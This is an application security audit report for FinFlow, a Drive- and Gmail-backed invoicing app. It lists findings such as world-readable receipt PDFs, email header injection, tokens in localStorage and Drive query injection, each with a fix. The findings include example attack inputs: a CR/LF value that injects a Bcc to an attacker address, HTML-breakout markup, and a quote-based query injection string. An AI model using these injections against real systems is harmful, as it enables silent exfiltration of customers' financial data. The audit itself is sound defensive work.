# FinFlow — Security Audit Report

- **Date audited:** 2026-06-17
- **Auditor:** Vadim (application security)
- **Scope:** Full baseline application security review — Google OAuth & token handling, the Drive-as-database model (workspace isolation + public-read receipts/PDFs), the Gmail/WhatsApp delivery pipeline, secret/credential leakage, injection & output handling, dependency vulnerabilities, and prospective Capacitor/Android mobile surface.
- **Commit context:** branch `main`, working tree with uncommitted changes (see `git status`).
- **Overall risk verdict:** **High.** Two High-severity issues are exploitable today — public-read permissions on receipts and invoice PDFs expose customer PII / financial documents to anyone with a link, and the Gmail send path is vulnerable to email-header injection (silent Bcc exfiltration). Several Medium issues compound these (no logout data wipe, HTML-body XSS into recipient inboxes, tokens in `localStorage`, Drive query injection). No backend means some classes (secret storage) are architectural, not fixable in code.

---

## Executive summary

The highest-impact findings, in plain language:

1. **Every receipt image and invoice PDF is made "anyone with the link" readable on Google Drive.** These files contain customer names, tax IDs, addresses, amounts, and scanned receipts. The links are emailed/WhatsApped in cleartext and are permanent — anyone who ever sees a link (forwarded email, WhatsApp screenshot, message-history leak, browser history on a shared device) has unauthenticated, lasting access to that financial document. This is the single biggest exposure in the app.
2. **The "send invoice by email" feature lets a malicious or mistyped recipient value inject email headers.** The recipient field is free text and is dropped, unescaped and unvalidated, straight into the raw RFC-2822 message. A value containing a newline can add a `Bcc:` header and silently exfiltrate the invoice PDF to an attacker, or inject arbitrary additional recipients.
3. **Logout and account-switch do not clear the financial data cached in `localStorage`.** All expenses, invoices, clients, and business settings stay on the device after logout; the next person to use the browser (or the next Google account signed in) can read the previous user's financial records.
4. **Access tokens (with `drive.file` + `gmail.send` scope) live in `localStorage`,** readable by any successful XSS and persisted across sessions. Combined with the unescaped HTML email body (a stored-XSS-style sink into recipients' inboxes) this raises the blast radius.
5. **Dependencies:** `npm audit` reports 1 High (Vite, dev-server only) and 2 Moderate (`dompurify`, `tar` — transitive). None are in the production runtime path, but they should be patched.

---

## Findings

### F-1 — Receipts and invoice PDFs are world-readable on Drive (PII / financial-data exposure)
- **Severity:** **High** (impact: high — customer PII, tax IDs, amounts, scanned receipts; likelihood: high — happens automatically on every upload, links shared in cleartext).
- **Location:**
  - `src/services/googleDrive.ts:316-332` (`setPublicPermission` — `role: 'reader', type: 'anyone'`)
  - `src/services/googleDrive.ts:362` (applied to every uploaded invoice PDF)
  - `src/services/googleDrive.ts:404-406` (applied to every uploaded receipt)
- **Exploit scenario:** A freelancer uploads a receipt and sends an invoice. Both files get `anyone-with-link` reader permission and a `webViewLink`. The invoice link is sent over Gmail and WhatsApp (`src/services/gmail.ts:146`, `src/services/share.ts:64`). Anyone who later obtains that link — a forwarded email, a leaked WhatsApp chat, a shoulder-surfed screen, malware reading message history, or Google indexing if a link is ever pasted on the web — can open the PDF with no authentication. The PDF contains the business's and the customer's tax IDs, address, line items, and totals (`src/services/pdf/InvoiceTemplate.tsx:64-125`). Receipts are even more sensitive (raw supplier documents). Access is permanent — the app never revokes the permission. Drive file IDs are not guessable, so this is link-disclosure, not enumeration, but the links are deliberately distributed.
- **Recommended fix:**
  - Preferred: do **not** set `type: 'anyone'`. The whole point of the OAuth `gmail.send` scope is that the app emails the PDF as an **attachment** (it already does — `gmail.ts:62-66`), so the public Drive link is redundant for the email path. Drop the public link from the email body, or replace the "View online" link with the attachment only.
  - If a shareable link is genuinely required (WhatsApp has no attachment), scope the permission tighter: share to the specific recipient's Google identity (`type: 'user', emailAddress`) where known, and/or generate the permission on-demand with an expiry the app revokes after a window. Document that `type: 'anyone'` is a deliberate, reviewed exception if it must stay.
  - The original justification ("avoid *You need access* across multiple Google logins") is a UX problem, not a reason to publish financial PII — solve it with per-recipient sharing, not world-read.
- **Hand to `alex`:** Yes — change request: remove `type: 'anyone'` default; make the email path attachment-only (no public link); for WhatsApp, gate public sharing behind an explicit per-invoice user action with the narrowest permission possible.

### F-2 — Email header injection in the Gmail send path (silent PDF exfiltration)
- **Severity:** **High** (impact: high — silent exfiltration of financial PDFs / arbitrary mail from the user's account; likelihood: medium — requires a crafted/mistyped recipient or a compromised client record).
- **Location:**
  - `src/services/gmail.ts:53` — `To: ${params.to}` interpolated raw into the MIME message
  - `src/services/gmail.ts:51-70` — headers joined with `\r\n`, so a CR/LF in `to` starts a new header
  - `src/components/SendInvoiceModal.tsx:84` (`to: email.trim()`), `:77-78` (only an `email.trim()` truthiness check — no format validation; `type="email"` on the input at `:169` is **not** enforced on programmatic send)
- **Exploit scenario:** The recipient field accepts any string. A value like `victim@example.com\r\nBcc: attacker@evil.com` produces a MIME blob where the attacker's address becomes a real `Bcc`, so the invoice PDF (containing the customer's PII) is silently copied to the attacker. Because the recipient defaults from the client record (`SendInvoiceModal.tsx:31`), a tampered `app_data.json` (which is fully user/attacker-editable in Drive — see F-7) or a shared/compromised client entry can carry the payload so the user never sees it. The same newline trick can inject `Subject`, additional `To`, or break the body boundary. The subject is RFC-2047 encoded (`:30`) so it's safe, but `To` is not.
- **Recommended fix:**
  - Validate the recipient is a single, well-formed email with **no** CR/LF/control characters before building the MIME (reject anything matching `/[\r\n]/` and anything that isn't a valid single address).
  - Defense-in-depth: strip CR/LF from every interpolated header value in `buildMimeMessage`.
- **Hand to `alex`:** Yes — add strict recipient validation in `SendInvoiceModal.handleSendEmail` and a header-sanitization guard in `gmail.ts`.

### F-3 — Logout / account-switch does not clear cached financial data (and tokens persist by default)
- **Severity:** **Medium** (impact: high on a shared device — full financial dataset of the prior user; likelihood: medium).
- **Location:**
  - `src/context/AuthContext.tsx:137-152` (`logout` removes only `auth_user`/`auth_token`/`auth_expiry`)
  - `src/context/FinanceContext.tsx:386-391` (writes `finance_expenses`, `finance_clients`, `finance_invoices`, `finance_booking_agents`, `finance_business_settings` to `localStorage`)
  - No code clears the `finance_*` keys on logout (confirmed: only `finance_active_business` is removed, and only when deleting the last workspace — `FinanceContext.tsx:763`).
- **Exploit scenario:** User signs out on a shared/public computer. `auth_*` is cleared but `finance_invoices`, `finance_clients` (customer PII), `finance_expenses` remain in `localStorage` in plaintext. The next person opens DevTools (or the app, which hydrates from these keys at `FinanceContext.tsx:281-287`) and reads the prior user's full financial records. Account-switch has a related leak window: the new session hydrates from the previous user's cached `finance_*` until the Drive fetch completes.
- **Recommended fix:** On `logout`, remove all `finance_*` keys (or `localStorage.clear()` after capturing anything that must survive). On detecting a different signed-in account, purge the `finance_*` cache before hydrating. Consider not caching full PII datasets in `localStorage` at all, or gating it behind an explicit "remember on this device" choice.
- **Hand to `alex`:** Yes — extend `logout` to clear `finance_*`; purge cache on account change.

### F-4 — Unescaped untrusted content in the HTML email body (HTML/markup injection into recipient inboxes)
- **Severity:** **Medium** (impact: medium — markup/link injection rendered in a third party's email client; likelihood: medium).
- **Location:** `src/services/gmail.ts:80-155` (`buildHtmlBody`) — `item.description` (`:87`), `params.businessName` (`:103`), and `params.driveUrl` (`:146`, inside `href`) are interpolated into HTML with no escaping. `Content-Type: text/html` is set at `:58`.
- **Exploit scenario:** An invoice line description or business name containing HTML (e.g. `<a href=...>`, `<img src=... onerror=...>`, or a crafted `"><...>` to break out of the `href`) is sent as live HTML to the recipient. Most modern mail clients strip scripts, so this is unlikely to be full JS execution in the recipient's client, but it enables convincing phishing links/branding spoofing inside a legitimately-sent FinFlow invoice, and content/attribute-injection into the `href`. The same untrusted strings render into the on-screen DOM and the PDF template; React auto-escapes JSX (`InvoiceTemplate.tsx`), so the in-app/PDF path is safe — the email HTML path is the gap.
- **Recommended fix:** HTML-escape every interpolated value in `buildHtmlBody` (`& < > " '`). Validate/encode `driveUrl` as a URL and ensure it's an `https://` Drive URL before placing it in `href`. A small escape helper is sufficient; the project already pulls in `dompurify` transitively if a library is preferred.
- **Hand to `alex`:** Yes — add HTML-escaping to `buildHtmlBody`.

### F-5 — OAuth access tokens stored in `localStorage`
- **Severity:** **Medium** (impact: high — token grants Drive + Gmail send; likelihood: low-medium, contingent on an XSS or local access).
- **Location:** `src/context/AuthContext.tsx:95-96`, `src/services/auth.ts:161-162` (token + 1h expiry written to `localStorage`); read throughout (`auth.ts:149-150`, `AuthContext.tsx:31`).
- **Exploit scenario:** `localStorage` is readable by any JavaScript in the origin. Any XSS (see F-4 for an injection sink, and the unescaped-data theme generally) or a malicious dependency can read `auth_token` and use it directly against Drive and Gmail (scopes include `gmail.send`, so an attacker could send mail as the user). Tokens also persist on disk on shared devices. There is no httpOnly-cookie option here because there is no backend (architectural — see Out of scope).
- **Recommended fix:** Given the no-backend constraint, `localStorage` is hard to avoid for web. Mitigations: keep the access token in memory only (React state) and rely on the plugin's silent refresh (`getValidAccessToken` already supports refresh) instead of persisting it; on native, store via Capacitor secure storage / Android Keystore rather than WebView `localStorage`. At minimum, shorten persisted lifetime and clear on logout (overlaps F-3). Reducing scope (F-9) limits the damage if a token leaks.
- **Hand to `alex`:** Partial — the in-memory-token refactor is a code change for `alex`; the secure-native-storage decision needs an architecture call (Out of scope item).

### F-6 — Google Drive query injection via unescaped names
- **Severity:** **Medium** (impact: medium — broken/altered Drive queries; likelihood: medium for breakage, low for cross-data impact since it's the user's own Drive).
- **Location:** `src/services/googleDrive.ts:56` — `name = '${name}'` interpolated into the Drive `q` parameter; `name` comes from user-controlled business names (`createBusiness`, `AppLayout.tsx:74`), receipt vendor/date/filename (`uploadReceiptToDrive:384`), and `findFileId` callers generally.
- **Exploit scenario:** A business name or vendor containing a single quote (e.g. `O'Brien`, or `' or '1'='1`) breaks the query string syntax or alters the predicate. Within Drive's query language this can cause the lookup to fail (DoS / corrupted workspace resolution — the app might fail to find or wrongly match a folder) or, with a crafted value, broaden the match within the user's own Drive. Cross-user impact is bounded because every query runs against the authenticated user's own Drive with their token. Still a correctness/robustness and injection-hygiene issue and an unvalidated-input class to close.
- **Recommended fix:** Escape single quotes (and backslashes) in any value interpolated into a Drive `q` (`name.replace(/\\/g, '\\\\').replace(/'/g, "\\'")`), or validate/reject names containing quotes and control characters at input time. Apply to `findFileId`, `listBusinesses`, and the upload helpers.
- **Hand to `alex`:** Yes — add a `q`-value escaper used by all Drive name lookups.

### F-7 — `app_data.json` is parsed and trusted without validation
- **Severity:** **Medium** (impact: medium — drives the injection sinks above; likelihood: medium — the file is fully user-editable, and merge logic trusts it).
- **Location:** `src/services/googleDrive.ts:173-179` (`fetchAppState` returns `response.json()` with no schema check); consumed at `src/context/FinanceContext.tsx:338-357`; merged untrusted in `mergeAppState` (`googleDrive.ts:229-238`). Also `FinanceContext.tsx:281-287` `JSON.parse` of `localStorage`.
- **Exploit scenario:** The "database" is a JSON file in the user's own Drive that the user (or anything with write access to that Drive folder, e.g. a shared workspace or a Drive-resident attacker) can edit freely. Tampered values flow unvalidated into: the email `To`/`Bcc` (F-2, via client records), the HTML email body and PDF (F-4), Drive queries (F-6), and financial math. There is no `Object.prototype`/`__proto__` stripping on `JSON.parse`, no type/shape validation, and no bounds checking on numbers. Because there is no server, this file is the trust boundary and it is currently trusted implicitly.
- **Recommended fix:** Validate `app_data.json` against a schema on load (e.g. zod or hand-rolled guards): correct types, expected fields, sane numeric bounds, no unexpected keys; drop/repair invalid records rather than feeding them downstream. Strip `__proto__`/`constructor` keys when parsing remote/cached JSON. This single control hardens F-2/F-4/F-6 at the source.
- **Hand to `alex`:** Yes — add load-time validation/sanitization of `AppState`.

### F-8 — `window.open` without `noopener` for the WhatsApp deep link
- **Severity:** **Low** (impact: low — reverse-tabnabbing; likelihood: low).
- **Location:** `src/services/share.ts:86` — `window.open(url, '_blank')` with no `noopener,noreferrer`.
- **Exploit scenario:** The opened `wa.me` page receives a `window.opener` reference and could (in principle, for a malicious destination) navigate the FinFlow tab. `wa.me` is trusted, so risk is low, but the message text is user-controlled and `encodeURIComponent`-encoded (`:85`, good — no injection there). Hardening only.
- **Recommended fix:** `window.open(url, '_blank', 'noopener,noreferrer')`.
- **Hand to `alex`:** Optional — trivial hardening.

### F-9 — OAuth scope breadth (`gmail.send`) and token reuse for both Drive and Gmail
- **Severity:** **Low/Info** (impact: raises blast radius of a leaked token; likelihood: n/a — design observation).
- **Location:** `src/services/auth.ts:62-67` — requests `drive.file` + `gmail.send` together; the single token is reused for all calls (`gmail.ts:171`, all of `googleDrive.ts`).
- **Notes:** `drive.file` is appropriately narrow (only app-created files — good). `gmail.send` is sensitive: a leaked token (F-5) can send mail as the user. This is functionally required for the email feature, so it's a documented tradeoff, not a defect — but it makes F-2/F-4/F-5 worse and is worth a conscious decision. Confirm the Google Cloud OAuth consent screen and verification status match these scopes.
- **Recommended fix:** Keep scopes minimal (they are). Consider requesting `gmail.send` incrementally only when the user first sends an email, rather than at initial login, so most sessions hold a Drive-only token.
- **Hand to `alex`:** Optional — incremental authorization is a code change if you want it.

### F-10 — Verbose console logging of auth/sync internals
- **Severity:** **Info.**
- **Location:** `src/services/auth.ts:30,36,167`; `src/services/googleDrive.ts:63,95,116,330`; `src/context/FinanceContext.tsx:453`. The token itself is **not** logged (good — `auth.ts:167` logs the error object, not the token), but login status, Drive API errors, and sync state are. In a client SPA these are visible in the user's own console only.
- **Recommended fix:** Strip or gate debug logging behind a dev flag for production builds to avoid leaking operational detail and to keep error responses (which can carry Drive metadata) out of the console.
- **Hand to `alex`:** Optional.

---

## Dependency / advisory notes

`npm audit` on 2026-06-17 — **3 vulnerabilities (1 high, 2 moderate):**

| Package | Severity | Range affected | Issue | Fix |
|---|---|---|---|---|
| `vite` | High | `8.0.0 – 8.0.15` (installed `^8.0.12`) | `server.fs.deny` bypass on Windows alt-paths; transitive `launch-editor` NTLMv2 hash disclosure on Windows | Upgrade to the patched Vite 8.0.x. **Dev-server only** — not shipped in the production bundle; risk is to the developer's machine, primarily on Windows. |
| `dompurify` | Moderate | `<= 3.4.8` | `IN_PLACE`-mode XSS / DEFAULT_ALLOWED pollution | Transitive (pulled via a build/runtime dep, not directly imported by app code). Upgrade transitive to `> 3.4.8`. Note: app does **not** currently use DOMPurify for the email body — if you adopt it for F-4, pin a fixed version. |
| `tar` | Moderate | `<= 7.5.15` | PAX header parser file-smuggling differential | Transitive (tooling). Upgrade to `> 7.5.15`. |

Action: run `npm audit fix` (and verify Vite minor bump doesn't break the build). None of the three are in the production runtime request path, so none are independently exploitable against an end user — but patch them to reduce supply-chain/dev-machine risk. Re-run `npm audit` before each release; advisories change frequently.

Other dependency observations: production runtime deps (`react 19`, `react-router 7`, `jspdf 4`, `html2canvas`, `recharts`, `i18next`, `@capgo/capacitor-social-login 8`) had no flagged advisories at audit time. Confirm again at release.

---

## Secrets / credential review (no leak found)

- `.env.local` is **gitignored and not tracked** (verified `git ls-files`), and contains only `VITE_GOOGLE_CLIENT_ID` — a **public** OAuth Web client ID, not a secret. There is **no** client secret in the repo, bundle, or config (correct for a public SPA/OAuth-PKCE client). The client ID being baked into `dist/` (`apps.googleusercontent.com` present) is expected and not a finding.
- No hardcoded API keys, `GOCSPX-` client secrets, or credentials found in tracked files.
- `git grep` for `client_secret|api_key|secret|GOCSPX` returned nothing sensitive.

---

## Mobile (Capacitor / Android) — prospective

The `android/` (and `ios/`) directories are gitignored and not generated in this checkout, so the native projects could not be audited directly. Based on `capacitor.config.ts` and the web code, flag these for the mobile build review:

- **WebView config:** no `server.allowNavigation`, `server.cleartext`, or `allowMixedContent` set in `capacitor.config.ts` (good — defaults are secure). When the Android project is generated, verify `android:usesCleartextTraffic` is **false** and there is no permissive `network_security_config.xml`.
- **Token storage on native:** `localStorage` in the Android WebView is not encrypted at rest. The token-in-`localStorage` issue (F-5) is worse on a rooted/backed-up device — use Capacitor Preferences with secure storage / Android Keystore for the token on native.
- **Deep links / exported components:** no custom URL scheme or `intent-filter` is configured in `capacitor.config.ts`; the social-login plugin will register its own OAuth redirect handling — verify the generated `AndroidManifest.xml` does not export activities unnecessarily and that the OAuth redirect intent is not hijackable (use an app-specific scheme / App Links with verification).
- **Debuggable builds:** ensure release APKs are built with `android:debuggable="false"` and minification/R8 enabled.
- **`appId` `com.finflow.app`** — fine; confirm it matches the registered OAuth Android client and SHA fingerprints.

These are advisory until the native project is available; re-audit once `android/` is generated.

---

## Out of scope / needs an architecture decision

- **No backend = client-held secrets and trust boundary on the user's Drive.** With no server, (a) the access token must live somewhere the JS can read it (F-5 can be mitigated but not eliminated for web), and (b) `app_data.json` is an inherently user-controlled, tamperable data store (F-7) — the app can validate it but can never *trust* it. Decide whether these limits are acceptable for handling tax IDs / PII, or whether a thin backend (token broker + server-side Drive/Gmail proxy + signed share links) is warranted. This is the root architectural call behind F-1, F-2, F-5, and F-7.
- **Public-link sharing vs. UX (F-1):** removing `type: 'anyone'` may reintroduce the "need access" friction the comment describes for multi-account users on the WhatsApp path. Decide the acceptable tradeoff (per-recipient sharing, expiring links, or attachment-only).
- **Gmail `gmail.send` scope (F-9):** product decision on whether to keep it at login vs. incremental, and to confirm Google OAuth app verification covers it.
- **Native projects (Android/iOS):** not present in this checkout; mobile findings are prospective and need a pass once generated.

---

## Suggested remediation order

1. **F-1** (public Drive permissions) and **F-2** (email header injection) — both High, both exploitable now.
2. **F-3** (logout cache wipe) and **F-4** (email HTML escaping) — quick, high-value.
3. **F-7** (validate `app_data.json`) — hardens F-2/F-4/F-6 at the source.
4. **F-6** (Drive `q` escaping), **F-5** (token handling), dependency `npm audit fix`.
5. **F-8/F-9/F-10** — hardening.
